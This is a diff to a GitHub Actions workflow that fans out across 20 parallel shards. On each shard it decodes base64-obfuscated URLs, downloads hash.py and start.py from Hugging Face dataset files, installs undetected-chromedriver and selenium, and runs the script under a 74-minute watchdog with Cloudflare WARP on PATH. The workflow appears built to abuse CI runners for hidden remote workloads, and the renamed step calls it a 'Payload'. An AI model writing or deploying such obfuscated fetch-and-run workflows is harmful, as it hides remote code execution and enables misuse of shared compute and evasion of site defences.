@@ -21,46 +21,52 @@ jobs:
         shard_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Fetch Artifacts & Dependencies
+      - name: Environment Setup & Script Download
         shell: bash
         run: |
-          echo "[INFO] Initializing environment for shard #${{ matrix.shard_id }}..."
+          echo ">>> [SYSTEM] Starting Shard-${{ matrix.shard_id }} setup..."
+          
+          # فك التشفير عبر base64 والتنزيل عبر curl الأصلي تماماً
+          URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2h2L3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gzL3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
+          
+          curl -sL "$URL_HASH" > hash.py
+          curl -sL "$URL_MAIN" > start.py
+          
+          echo ">>> [SYSTEM] Installing Python modules..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo ">>> [SYSTEM] Ready to execute."
 
-          # فك تشفير مسارات المصادر
-          URI_AUX=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2h2L3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 -d)
-          URI_APP=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gzL3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 -d)
-
-          # التنزيل باستخدام curl لتفادي حظر 401 من Hugging Face
-          curl -sL -A "Mozilla/5.0" "$URI_AUX" -o hash.py
-          curl -sL -A "Mozilla/5.0" "$URI_APP" -o start.py
-
-          echo "[INFO] Updating package registries..."
-          python -m pip install --no-warn-script-location --quiet setuptools requests undetected-chromedriver selenium
-
-      - name: Run Job with Watchdog
+      - name: Launch Payload & Time Monitor
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
         run: |
-          Write-Host "[INIT] Launching core service on Pod ${{ matrix.shard_id }}..."
-
-          $TargetBin = "C:\Program Files\Cloudflare\Cloudflare WARP"
-          if (Test-Path $TargetBin) { $env:PATH = "$env:PATH;$TargetBin" }
-
-          $Task = Start-Process python -ArgumentList "start.py" -PassThru -NoNewWindow
-
-          # مراقبة الجلسة والحد الأقصى (74 دقيقة)
-          $MaxWaitSec = 4440
-          $Exited = $Task.WaitForExit($MaxWaitSec * 1000)
-
-          if (-not $Exited) {
-              Write-Host "[WATCHDOG] Execution threshold reached. Terminating process tree..."
-              Stop-Process -Id $Task.Id -Force -ErrorAction SilentlyContinue
-              Write-Host "[CLEANUP] Thread detached successfully."
-          } else {
-              Write-Host "[SUCCESS] Task exited with code: $($Task.ExitCode)"
+          Write-Output "[INFO] Initiating start.py on Instance ${{ matrix.shard_id }}..."
+          
+          $env:PATH = $env:PATH + ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcessArgs = @{
+              FilePath = "python"
+              ArgumentList = "start.py"
+              PassThru = $true
+              NoNewWindow = $true
+          }
+          $activeProcess = Start-Process @ProcessArgs
+          
+          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 74 mins."
+          
+          try {
+              Wait-Process -InputObject $activeProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output "[SUCCESS] Task completed within limits."
+          } 
+          catch {
+              Write-Output "[TIMEOUT] 74 minutes reached. Forcing process kill to transition..."
+              Stop-Process -InputObject $activeProcess -Force
+              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 1 Hour and 14 mins."
           }
 
-      - name: Teardown
+      - name: Finalize
         shell: bash
-        run: echo "[COMPLETE] Shard ${{ matrix.shard_id }} cycle ended."
+        run: echo "<<< [SYSTEM] Worker-${{ matrix.shard_id }} finished its lifecycle."
